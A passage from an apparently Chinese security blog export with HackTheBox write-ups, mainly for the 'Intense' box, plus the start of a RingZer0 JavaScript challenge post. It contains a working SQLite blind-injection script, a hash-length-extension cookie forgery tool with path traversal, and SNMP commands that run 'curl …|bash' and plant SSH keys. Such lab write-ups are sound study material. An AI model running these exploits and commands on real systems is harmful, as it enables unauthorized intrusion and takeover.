AAAAB3NzaC1yc2EAAAADAQABAAABgQC1dF791Ph8rC/PU4fXFjW4rBuU8JbmozNWx1kll3NA5r/vhpG05UZ/7dl8+Hs+bbnv/4TMferXgPj27QFJNGBuEfM+ZVO9ah5QNTwrO26vlCP885GyO0RoAoFM0ZNQaYfim1j6zrnplgWtJ7rIHRyrxt6ZDCFq7hGQm8CQP1xbVeaYoYYYHAVVt3IxDbeHh5pJsZDNvzsh1RZNCQlLdwvpoDdWhNPYq+lNYWSjGmW9nMVgQzcY1rk2IEf0Cg5NbZyFtBHITEG0myWIEXtg8D+t9f3IZbgzjaXkN4lVbGAGhNHvfrCemrmTWCbfpuoSS7mE65qfo87yVJdxwWYbx47fe0FMGtDBexa/+WyRApN+E/n3D+Dk56bnzSWiWzzxQptxJVPnM+txWOA6aixGb0PJpO1Wa2S29kg1C4GLNaEKXupursO7Vewq4ZCyzQmeWi2g8BljNqjIA89C9v2cRyFx+lIILxwNn2xbjVVf/WYjcE3lXLpqqz2CzCfuR+4xbSU= root@byc404\")f:close() 在靶机上起个python监听9001,然后kali运行脚本。看到靶机上获取到lua脚本后就可以root ssh登录了。 rooted. summary insane难度的靶机首先确实有一定难度。不过整体上我感觉跟travel难度差不多。主要enum的过程没有那么枯燥,而利用起来的难度也没那么高。但是总归还是很有水平的靶机。需要我们耐心的去整合信息并学习新知识。编写mc跟lua插件都是提醒我们不要任意允许用户上传自定义插件。","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"hackthebox-Intense","slug":"hackthebox-Intense","date":"2020-07-22T10:40:50.000Z","updated":"2021-02-18T05:09:19.359Z","comments":true,"path":"2020/07/22/hackthebox-Intense/","link":"","permalink":"https://www.bycsec.top/2020/07/22/hackthebox-Intense/","excerpt":"纠结了好久要不要写这篇wp.最后还是打算把流程过一遍吧。首先这台靶机没料到的是开开心心做到root部分发现是个pwn一脸懵逼。想自己上手最后发现还是tcl,只好去请教朋友。所幸最后还是打成了。因此pwn部分我不做解释,主要把前面getshell流程写一遍。","text":"纠结了好久要不要写这篇wp.最后还是打算把流程过一遍吧。首先这台靶机没料到的是开开心心做到root部分发现是个pwn一脸懵逼。想自己上手最后发现还是tcl,只好去请教朋友。所幸最后还是打成了。因此pwn部分我不做解释,主要把前面getshell流程写一遍。 initial foothold第一部分先是nmap扫描,发现只开了22,80端口。那就直接从web下手。 访问到页面后发现更加直接了。题目给了我们关键信息说网站是开源的,下载src.zip直接得app源码。那就愉快的审计了。 主体代码app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from flask import Flask, request, render_template, g, redirect, url_for,\\ make_responsefrom utils import get_db, get_session, get_user, try_login, query_db, badword_in_strfrom admin import adminimport sqlite3import lwtapp = Flask(__name__)app.register_blueprint(admin)@app.teardown_appcontextdef close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close()@app.route('/submit', methods=[\"GET\"])def submit(): session = get_session(request) if session: user = get_user(session[\"username\"], session[\"secret\"]) return render_template(\"submit.html\", page=\"submit\", user=user) return render_template(\"submit.html\", page=\"submit\")@app.route(\"/submitmessage\", methods=[\"POST\"])def submitmessage(): message = request.form.get(\"message\", '') if len(message) &gt; 140: return \"message too long\" if badword_in_str(message): return \"forbidden word in message\" # insert new message in DB try: query_db(\"insert into messages values ('%s')\" %message) except sqlite3.Error as e: return str(e) return \"OK\"@app.route(\"/login\", methods=[\"GET\"])def login(): return render_template(\"login.html\", page=\"login\")@app.route(\"/postlogin\", methods=[\"POST\"])def postlogin(): # return user's info if exists data = try_login(request.form) if data: resp = make_response(\"OK\") # create new cookie session to authenticate user session = lwt.create_session(data) print(session) cookie = lwt.create_cookie(session) resp.set_cookie(\"auth\", cookie) return resp return \"Login failed\"@app.route(\"/logout\")def logout(): resp = make_response(\"&lt;script&gt;document.location.href='/';&lt;/script&gt;\") resp.set_cookie(\"auth\", \"\", expires=0) return resp@app.route(\"/\")@app.route(\"/home\")def index(): session = get_session(request) if session and \"username\" in session: user = get_user(session[\"username\"], session[\"secret\"]) print(user) return render_template(\"home.html\", page=\"home\", user=user) return render_template(\"home.html\", page=\"home\")if __name__ == \"__main__\": app.run('0.0.0.0',5000) admin.py 123456789101112131415161718192021222324252627282930313233from flask import Blueprint, render_template, request, redirect, abortfrom utils import is_admin, admin_view_log, admin_list_logadmin = Blueprint('admin', __name__)@admin.route(\"/admin\")def admin_home(): if not is_admin(request): abort(403) return render_template(\"admin.html\")@admin.route(\"/admin/log/view\", methods=[\"POST\"])def view_log(): if not is_admin(request): abort(403) logfile = request.form.get(\"logfile\") if logfile: logcontent = admin_view_log(logfile) return logcontent return ''@admin.route(\"/admin/log/dir\", methods=[\"POST\"])def list_log(): if not is_admin(request): abort(403) logdir = request.form.get(\"logdir\") if logdir: logdir = admin_list_log(logdir) return str(logdir) return '' lwt.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from hashlib import sha256from base64 import b64decode, b64encodefrom random import randrangeimport osSECRET = os.urandom(randrange(8, 15))class InvalidSignature(Exception): passdef sign(msg): \"\"\" Sign message with secret key \"\"\" return sha256(SECRET + msg).digest()def verif_signature(data, sig): \"\"\" Verify if the supplied signature is valid \"\"\" return sign(data) == sigdef parse_session(cookie): \"\"\" Parse cookie and return dict @cookie: \"key1=value1;key2=value2\" return &#123;\"key1\":\"value1\",\"key2\":\"value2\"&#125; \"\"\" b64_data, b64_sig = cookie.split('.') data = b64decode(b64_data) sig = b64decode(b64_sig) if not verif_signature(data, sig): raise InvalidSignature info = &#123;&#125; for group in data.split(b';'): try: if not group: continue key, val = group.split(b'=') info[key.decode()] = val except Exception: continue return infodef create_session(data): \"\"\" Create session based on dict @data: &#123;\"key1\":\"value1\",\"key2\":\"value2\"&#125; return \"key1=value1;key2=value2;\" \"\"\" session = \"\" for k, v in data.items(): session += f\"&#123;k&#125;=&#123;v&#125;;\" return session.encode()def create_cookie(session): cookie_sig = sign(session) print(cookie_sig) return b64encode(session) + b'.' + b64encode(cookie_sig) utils.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112import lwtimport sqlite3from hashlib import sha256from flask import gfrom os import listdir, pathimport datetimeDATABASE = \"database.db\"class User: def __str__(self): return \"User(username=%s,role=%d)\" % (self.username,self.role)def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect(DATABASE) return dbdef log_login(user): now = datetime.datetime.now() d = now.strftime(\"%Y-%m-%d\") with open(f\"logs/&#123;d&#125;.log\", 'a') as log: log.write(str(user) + ' logged\\n')def badword_in_str(data): data = data.lower() badwords = [\"rand\", \"system\", \"exec\", \"date\"] for badword in badwords: if badword in data: return True return Falsedef hash_password(password): \"\"\" Hash password with a secure hashing function \"\"\" return sha256(password.encode()).hexdigest()def query_db(query, args=(), one=False): cur = get_db().execute(query, args) rv = cur.fetchall() cur.close() return (rv[0] if rv else None) if one else rvdef get_user(username, secret): \"\"\" Returns User object if given username/secret exist in DB \"\"\" username = username.decode() secret = secret.decode() res = query_db(\"select role from users where username = ? and secret = ?\", (username, secret), one=True) if res: user = User() user.username = username user.role = res[0] log_login(user) return user return Nonedef try_login(form): \"\"\" Try to login with the submitted user info \"\"\" if not form: return None username = form[\"username\"] password = hash_password(form[\"password\"]) result = query_db(\"select count(*) from users where username = ? and secret = ?\", (username, password), one=True) if result and result[0]: return &#123;\"username\": username, \"secret\":password&#125; return Nonedef get_session(request): \"\"\" Get user session and parse it \"\"\" if not request.cookies: return if \"auth\" not in request.cookies: return cookie = request.cookies.get(\"auth\") try: info = lwt.parse_session(cookie) except lwt.InvalidSignature: return &#123;\"status\": -1, \"msg\": \"Invalid signature\"&#125; return infodef is_admin(request): session = get_session(request) if not session: return None if \"username\" not in session or \"secret\" not in session: return None user = get_user(session[\"username\"], session[\"secret\"]) return user.role == 1#### Logs functions ####def admin_view_log(filename): if not path.exists(f\"logs/&#123;filename&#125;\"): return f\"Can't find &#123;filename&#125;\" with open(f\"logs/&#123;filename&#125;\") as out: return out.read()def admin_list_log(logdir): if not path.exists(f\"logs/&#123;logdir&#125;\"): return f\"Can't find &#123;logdir&#125;\" return listdir(logdir) 这个flask源码整体实现了sqlite的数据库查询。库中有admin账户。通过cookie来判断admin.并且admin有读文件跟列目录的功能。 首先从utils.py看起。这里的函数关于sqlite执行部分均做了占位符查询，所以不存在注入问题。def badword_in_str(data)做了关键字的筛选。我们去到调用函数的地方,很容易就发现处理的位置/submitmessage存在insert into 型的sql注入。 注意源码中这里注入的地方返回值是两种：”OK”或者报错。很快就能反应过来是sqlite盲注,并且是使用报错函数来区分布尔值。 关于sqlite的盲注,普通的布尔盲注与sql注入没什么区别。但是在sql时间盲注的情形下就需要另外处理。因为sqlite没有延时函数,所以想要区分只能利用报错。(这点在st98大佬出的sqlite_voting,前阵子asis的adminpanel中都出现过) 常用的报错函数之RANDOMBLOB()不可用的话,还可以用abs,json等函数。 这里用abs函数简单构造一个demo 123insert into messages values(&#39;1&#39;) union select abs(-9223372036854775808);&#x3D;&gt;1&#39;) union select abs(case when (1&#x3D;1) then (-9223372036854775808) else 0 end) -- 有个小细节需要注意。不知道是不是insert into语句的问题,如果我们利用abs(-9223372036854775808)这个整体来构造布尔值的话。当语句中出现select会一直报错。而如果我们利用-9223372036854775808来作为真值的话则不会出现这个问题。 综上,上面这部分很快就能编写exp.本地跑的话,先写个sql因为题目源码中很明确的出现了几个列名，所以可以快速编写并创建本地的db.远程跑 123456789101112131415161718192021import requestsimport stringURL =\"http://10.10.10.195\"flag = \"\"for i in range(1, 65): a=0 for j in string.printable: print(\"\\r\" + flag, flush=False, end='') payload = \"a') union select abs(case when (substr((select password from users limit 0,1),\" + str(i) + \",1)='\" + j + \"') then(-9223372036854775808) else 0 end )--\" data = &#123;'message': payload&#125; r = requests.post(URL + 'submitmessage', data=data) if 'overflow' in r.text: a=1 flag += j print(\"\\r\" + flag, flush=True, end='') break if a==0: breakprint(\"\\r\")return flag 得到hashf1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105 拿到hash后尝试解时果然没有得到明文。看来另有玄机。注意到 lwt.py中一个很显眼的部分 12345SECRET = os.urandom(randrange(8, 15))def sign(msg): \"\"\" Sign message with secret key \"\"\" return sha256(SECRET + msg).digest() 这里作为盐值的SECRET处于hash算法sha256的前端。这说明是存在hash扩展攻击的。我们仔细看下其调用位置。 123456789101112131415161718192021def parse_session(cookie): \"\"\" Parse cookie and return dict @cookie: \"key1=value1;key2=value2\" return &#123;\"key1\":\"value1\",\"key2\":\"value2\"&#125; \"\"\" b64_data, b64_sig = cookie.split('.') data = b64decode(b64_data) sig = b64decode(b64_sig) if not verif_signature(data, sig): raise InvalidSignature info = &#123;&#125; for group in data.split(b';'): try: if not group: continue key, val = group.split(b'=') info[key.decode()] = val except Exception: continue return info 这里可以发现。它取cookie中由.分割开的两部分分别作为data与sign.其中data是username=guest;secret=SHA256{guest}的base64数据。从这里的取键值返回info的函数很快就能发现存在变量覆盖。比如我们在原始数据后添加username=admin;secret=xxx就能覆盖原先cookie中username与secret的值。而这正是hash长度扩展攻击能做到的：在原有数据上添加新的数据。 那么回过头来看下它是如何判断admin的。发现果然是从cookie中取admin与secret与数据库中的username与secret进行比较。返回其role值。为1即admin. 那么接下来就是hash长度扩展攻击了,由于SECRET长度有范围,所以需要小范围尝试一下。并且使用hashpumpy添加数据;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;之所以还要加个分号是因为我们的长度扩展攻击会在原始数据后添加\\x00之类的数据。而parse_session函数是按分号识别键,值的。需要另加一个分号避免后面的username键名带上前面的数据。 因为要做到列目录，读文件，肯定得重复调用。于是打算尝试下写完整的利用脚本来模拟命令行模式,总归是写出来了。虽然我觉得效果一般般,但毕竟是第一次写比较完整的利用,心里还是比较舒适的233. 因为sql注入部分本地只要10s不到。远程要10分钟多。所以特意加了default选项可以直接使用现成的用户名跟hash. 1python3 exp.py default 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#!/usr/bin/python3import requestsimport stringfrom hashpumpy import hashpumpfrom base64 import b64decode, b64encodefrom cmd import Cmdimport sysimport warningswarnings.filterwarnings('ignore')URL='http://10.10.10.195/'guest_cred=\"\"admin_cookie=&#123;&#125;class terminal(Cmd): #prompt = \"[*] =&gt; \" prompt='\\033[1;31;40m[*]\\033[0m'+' =&gt; '+'\\033[0;34;40m /var/www/html/app&gt; \\033[0m' print(\"[*] prompting a shell(current directory /var/www/html/app)\") def default(self, line): command=line.split(' ') try: print(admin_command(command[0],command[1])) except: passdef get_admin_name(): print(\"[*] getting admin username:\") flag = \"\" for i in range(1, 10): a=0 for j in string.printable: print(\"\\r\" + flag, flush=False, end='') payload = \"a') union select abs(case when (substr((select username from users limit 0,1),\" + str(i) + \",1)='\" + j + \"') then(-9223372036854775808) else 0 end )--\" data = &#123;'message': payload&#125; r = requests.post(URL + 'submitmessage', data=data) if 'overflow' in r.text: a=1 flag += j print(\"\\r\" + flag, flush=True, end='') break if a==0: break print(\"\\r\") return flagdef get_admin_hash(): print(\"[*] getting admin hash:\"+\"\\r\") flag = \"\" for i in range(1, 64 + 1): a=0 for j in string.printable: print(\"\\r\" + flag, flush=False, end='') payload = \"a') union select abs(case when (substr((select secret from users limit 0,1),\" + str(i) + \",1)='\" + j + \"') then(-9223372036854775808) else 0 end )--\" data = &#123;'message': payload&#125; r = requests.post(URL + 'submitmessage', data=data) if 'overflow' in r.text: a=1 flag += j print(\"\\r\" + flag, flush=True, end='') break if a==0: break print(\"\\r\") return flagdef guest_login(): print(\"[*] login with guest:guest\"+\"\\r\") global guest_cred users=&#123;'username':\"guest\",\"password\":\"guest\"&#125; r=requests.post(URL+'postlogin',data=users) old_data,old_sig=r.cookies['auth'].split('.') guest_cred=b64decode(old_data).decode() return b64decode(old_sig).hex()def crafting_payload(): if DEFAULT!=True: #from scratch admin_name=get_admin_name() admin_hash=get_admin_hash() else: #default admin_name=\"admin\" admin_hash=\"f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105\" old_sig = guest_login() old_data=guest_cred payload=';'+(\";\".join([\"username=\"+admin_name,\"secret=\"+admin_hash]))+\";\" new_sig=\"\" for length in range(8,15): res = hashpump(old_sig, old_data, payload,length) cookie=(b64encode(res[1])+b'.'+b64encode(bytes.fromhex(res[0]))).decode() if admin_login(cookie): print('[*] testing length '+str(length)+\" : \") print('[*] admin_cookie: '+ cookie) return cookie return \"[*] Failes getting proper cookie.\"def admin_login(cookie): cookies=&#123;\"auth\":cookie&#125; r=requests.get(URL+'admin',cookies=cookies) if r.status_code==403: return False else: return Truedef admin_command(option,command): if option not in ['dir','view']: return \"Only dir/view supported.\" elif option=='dir': r=requests.post(URL+'admin/log/dir',data=&#123;'logdir':command&#125;,cookies=admin_cookie) return r.text else: r = requests.post(URL + 'admin/log/view', data=&#123;'logfile': '../'+command&#125;,cookies=admin_cookie) return r.textif __name__=='__main__': if len(sys.argv)==2: if sys.argv[1]=='default': print(\"[*] use default username + password\") DEFAULT=True else: exit(\"[*] specify default flag\") else: DEFAULT=False admin_cookie['auth']=crafting_payload() terminal().cmdloop() 效果如图: 大致功能:跑起来就能得到admin跟hash;爆破出admin的cookie;支持假命令行dir跟view命令分别用来列目录跟读文件。 这样就能很快在/home/user下找到user.txt读取了。 小结下。这一部分我觉得难度一般。拿到CTF中倒是挺合适的。不过我觉得这个hash长度扩展以及前面注入时踩的不能用完整的abs()的坑算是给自己一些提醒。 privesc to shell 接下来这一部分有点玄妙。显然我们现在已经能读文件跟列目录了。但是却没有一个shell.而在user的目录下直接给了一个c的源码提示我们 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160// gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server#include &lt;signal.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#define BUFFER_SIZE 1024void handle_client(int sock) &#123; char note[BUFFER_SIZE]; uint16_t index = 0; uint8_t cmd; // copy var uint8_t buf_size; uint16_t offset; uint8_t copy_size; while (1) &#123; // get command ID if (read(sock, &amp;cmd, 1) != 1) &#123; exit(1); &#125; switch(cmd) &#123; // write note case 1: if (read(sock, &amp;buf_size, 1) != 1) &#123; exit(1); &#125; // prevent user to write over the buffer if (index + buf_size &gt; BUFFER_SIZE) &#123; exit(1); &#125; // write note if (read(sock, &amp;note[index], buf_size) != buf_size) &#123; exit(1); &#125; index += buf_size; break; // copy part of note to the end of the note case 2: // get offset from user want to copy if (read(sock, &amp;offset, 2) != 2) &#123; exit(1); &#125; // sanity check: offset must be &gt; 0 and &lt; index if (offset &lt; 0 || offset &gt; index) &#123; exit(1); &#125; // get the size of the buffer we want to copy if (read(sock, &amp;copy_size, 1) != 1) &#123; exit(1); &#125; // prevent user to write over the buffer's note if (index &gt; BUFFER_SIZE) &#123; exit(1); &#125; // copy part of the buffer to the end memcpy(&amp;note[index], &amp;note[offset], copy_size); index += copy_size; break; // show note case 3: write(sock, note, index); return; &#125; &#125;&#125;int main( int argc, char *argv[] ) &#123; int sockfd, newsockfd, portno; unsigned int clilen; struct sockaddr_in serv_addr, cli_addr; int pid; /* ignore SIGCHLD, prevent zombies */ struct sigaction sigchld_action = &#123; .sa_handler = SIG_DFL, .sa_flags = SA_NOCLDWAIT &#125;; sigaction(SIGCHLD, &amp;sigchld_action, NULL); /* First call to socket() function */ sockfd = socket(AF_INET, SOCK_STREAM, 0); if (sockfd &lt; 0) &#123; perror(\"ERROR opening socket\"); exit(1); &#125; if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int)&#123; 1 &#125;, sizeof(int)) &lt; 0) perror(\"setsockopt(SO_REUSEADDR) failed\"); /* Initialize socket structure */ bzero((char *) &amp;serv_addr, sizeof(serv_addr)); portno = 5001; serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); serv_addr.sin_port = htons(portno); /* Now bind the host address using bind() call.*/ if (bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; perror(\"ERROR on binding\"); exit(1); &#125; listen(sockfd,5); clilen = sizeof(cli_addr); while (1) &#123; newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen); if (newsockfd &lt; 0) &#123; perror(\"ERROR on accept\"); exit(1); &#125; /* Create child process */ pid = fork(); if (pid &lt; 0) &#123; perror(\"ERROR on fork\"); exit(1); &#125; if (pid == 0) &#123; /* This is the client process */ close(sockfd); handle_client(newsockfd); exit(0); &#125; else &#123; close(newsockfd); &#125; &#125; /* end of while */&#125; 这下我是真懵了。因为看起来就是个pwn题。但比pwn更重要的是,源码中可以看出来它跑在127.0.0.1 5001上。那么我们外网是访问不到的。这里似乎需要一个shell来访问。 于是继续进行信息收集。首先读了下/proc/net/tcp 1234567/proc/net/tcpsl local_address rem_address st tx_queue rx_queue tr tm-&gt;when retrnsmt uid timeout inode 0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 27909 1 0000000000000000 100 0 0 10 0 1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000 101 0 24101 1 0000000000000000 100 0 0 10 0 2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 28936 1 0000000000000000 100 0 0 10 0 3: 0100007F:1389 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 25962 1 0000000000000000 100 0 0 10 0 4: C30A0A0A:0050 570E0A0A:B5EE 01 00000000:00000000 00:00000000 00000000 33 0 328478 1 0000000000000000 138 4 30 10 7 这里1389对应的是5001的16进制。并且其uid是0。这说明是root运行,正好符合我们的要求。 接着突然发现一个/etc/snmp/snmpd.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475agentAddress udp:161view systemonly included .1.3.6.1.2.1.1view systemonly included .1.3.6.1.2.1.25.1 rocommunity public default -V systemonly rwcommunity SuP3RPrivCom90################################################################################# SYSTEM INFORMATION## Note that setting these values here, results in the corresponding MIB objects being &#39;read-only&#39;# See snmpd.conf(5) for more detailssysLocation Sitting on the Dock of the BaysysContact Me &lt;user@intense.htb&gt; # Application + End-to-End layerssysServices 72## Process Monitoring# # At least one &#39;mountd&#39; processproc mountd # No more than 4 &#39;ntalkd&#39; processes - 0 is OKproc ntalkd 4 # At least one &#39;sendmail&#39; process, but no more than 10proc sendmail 10 1## Disk Monitoring# # 10MBs required on root disk, 5% free on &#x2F;var, 10% free on all other disksdisk &#x2F; 10000disk &#x2F;var 5%includeAllDisks 10%## System Load# # Unacceptable 1-, 5-, and 15-minute load averagesload 12 10 5################################################################################# ACTIVE MONITORING# # send SNMPv1 traps trapsink localhost public## Event MIB - automatically generate alerts# # Remember to activate the &#39;createUser&#39; lines aboveiquerySecName internalUserrouser internalUser # generate traps on UCD error conditionsdefaultMonitors yes # generate traps on linkUp&#x2F;DownlinkUpDownNotifications yes## Arbitrary extension commands# extend test1 &#x2F;bin&#x2F;echo Hello, world! extend-sh test2 echo Hello, world! ; echo Hi there ; exit 35 master agentx 看到这个udp我就估计不妙，自己探测端口时肯定又忘记扫udp了。而且从这个snmp.conf中可以看到一个关键组SuP3RPrivCom90属于rwcommunity有着读写权限。于是我去搜索了下snmp相关漏洞,发现真的可以达成getshell 先nmap扫下确认 12345678910111213141516# Nmap 7.80 scan initiated Sun Jul 19 11:05:42 2020 as: nmap -sU -sC -oA nmap/intense-udp 10.10.10.195Nmap scan report for 10.10.10.195Host is up (0.43s latency).Not shown: 999 closed portsPORT STATE SERVICE161/udp open snmp| snmp-info: | enterprise: net-snmp| engineIDFormat: unknown| engineIDData: f20383648c26d05d00000000| snmpEngineBoots: 603|_ snmpEngineTime: 10h34m03s| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64|_ System uptime: 10h34m3.40s (3804340 timeticks)# Nmap done at Sun Jul 19 11:26:16 2020 -- 1 IP address (1 host up) scanned in 1234.34 seconds 果然配置不是localhost:161的话我们是可以外网直接访问的。接下来就是根据网上的文章进行了解了。https://digi.ninja/blog/snmp_to_shell.php 需要注意的是。要是出现了跟文章中一开始一样的报错,需要按照这篇 文章进行相关下载。我的kali默认也是会报错的,需要下载额外的依赖并修改配置。 成功运行snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1的话是这样的 从文章中了解到,如果直接修改conf文件,是可以利用extend 这一部分可执行命令的特点来进行恶意命令的插入。那么我们现在在远程,还有方法可以直接修改或者插入名令吗？当然是可以的。我很快找到了这篇文章。 https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/ 稍微调用下nsExtendObjects。会发现它会把extend里的命令都执行一回。 12345root@byc404:~# snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjectsNET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6NET-SNMP-EXTEND-MIB::nsExtendCommand.\"test\" = STRING: /bin/bashNET-SNMP-EXTEND-MIB::nsExtendCommand.\"test1\" = STRING: /bin/echoNET-SNMP-EXTEND-MIB::nsExtendCommand.\"test2\" = STRING: echo这里test本来不应该存在的。应该是其他人创建了这个变量。而它是/bin/.bash调用的。所以我直接拿来修改值 123snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendArgs.\"test\"' = '-c \"curl 10.10.14.87|bash\"'snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects getshell 这里我第一次试成功了,后来因为pwn不会就退出了。等第二天再尝试同样的方法getshell却发现总是返回timeout。换了vpn后不返回timeout却执行不了curl命令了……怀疑是curl的timeout有5s左右达到了snmptimeout的上限，所以执行不了curl.于是换了一个思路。我们总归是要通过访问靶机的5001来pwn到root的。那直接写ssh公钥然后端口转发也可以。 索性写个sh 12345678910#!/bin/bashssh-keygen -f ./intense -q -N \"\"key=$(cat intense.pub)snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \\ \"nsExtendStatus.\\\"test\\\"\" = createAndGo \\ \"nsExtendCommand.\\\"test\\\"\" = /bin/bash \\ \"nsExtendArgs.\\\"test\\\"\" = \"-c \\\"echo $&#123;key&#125; &gt;&gt; ~/.ssh/authorized_keys\\\"\"snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjectsssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense 这样整体执行起来不会因为连续的timeout导致手敲太多代码。 privesc to root因为不会所以拜托别人了。一个保护全开的栈溢出。涉及到一些socket知识。具体就参考jaubert的记录了 https://jaubert.gitee.io/crackme/ 远程打通 summary整体上前面我觉得不算难。snmap算是新知识。挺有意思的。pwn的部分直接自闭。看来以后也要开始学下cry跟pwn了……","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"RingZer0-CTF JavascriptChallenge","slug":"RingZer0-CTF-JavascriptChallenge","date":"2020-07-22T03:27:17.000Z","updated":"2021-02-18T05:09:46.303Z","comments":true,"path":"2020/07/22/RingZer0-CTF-JavascriptChallenge/","link":"","permalink":"https://www.bycsec.top/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/","excerpt":"在网上无意间看见一个CTF 解题平台，感觉里面的分类还挺有意思的。于是挑了一个javascript challenge来做一下。最近做题时经常感慨js的很多弱类型特性远比php丰富的多了，所以借此机会简单接触下js的魔鬼代码","text":"在网上无意间看见一个CTF 解题平台，感觉里面的分类还挺有意思的。于是挑了一个javascript challenge来做一下。最近做题时经常感慨js的很多弱类型特性远比php丰富的多了，所以借此机会简单接触下js的魔鬼代码 0x01首先js类型的题目必然是在静态页面就可以找到源码的。有时会加混淆，但混淆的机理其实基本上都挺一般的。这里直接查看页面源码 12345678910111213// Look's like weak JavaScript auth script :)$(\".c_submit\").click(function(event) &#123; event.preventDefault() var u = $(\"#cuser\").val(); var p = $(\"#cpass\").val(); if(u == \"admin\" &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125;&#125;); 发现一个用户密码的判断。成功登陆即可完成事件。那么我们把密码扔进console转换得到JavaScriptIsSecure.登陆拿flag. 0x02123456789101112// Look's like weak JavaScript auth script :) $(\".c_submit\").click(function(event) &#123; event.preventDefault(); var p = $(\"#cpass\").val(); if(Sha1.hash(p) == \"b89356ff6151527e89c4f3e3d30c8e6586c63962\") &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125;&#125;); 这里直接用明确的算法对密码进行加密然后与hash值进行比较。不过注意的是php里常见的0与0e的弱类型比较在js中是不会出现的（但是可能会出现其他弱类型问题） 所以直接去网上找得到adminz弱密码。 0x03一个典型的混淆。同样也是典型的解法。 1var _0xc360=[\"\\x76\\x61\\x6C\",\"\\x23\\x63\\x70\\x61\\x73\\x73\",\"\\x61\\x6C\\x6B\\x33\",\"\\x30\\x32\\x6C\\x31\",\"\\x3F\\x70\\x3D\",\"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\",\"\\x68\\x72\\x65\\x66\",\"\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\",\"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x27\\x65\\x72\\x72\\x6F\\x72\\x27\\x3E\\x57\\x72\\x6F\\x6E\\x67\\x20\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x20\\x73\\x6F\\x72\\x72\\x79\\x2E\\x3C\\x2F\\x64\\x69\\x76\\x3E\",\"\\x68\\x74\\x6D\\x6C\",\"\\x23\\x63\\x72\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\",\"\\x63\\x6C\\x69\\x63\\x6B\",\"\\x2E\\x63\\x5F\\x73\\x75\\x62\\x6D\\x69\\x74\"];$(_0xc360[12])[_0xc360[11]](function ()&#123;var _0xf382x1=$(_0xc360[1])[_0xc360[0]]();var 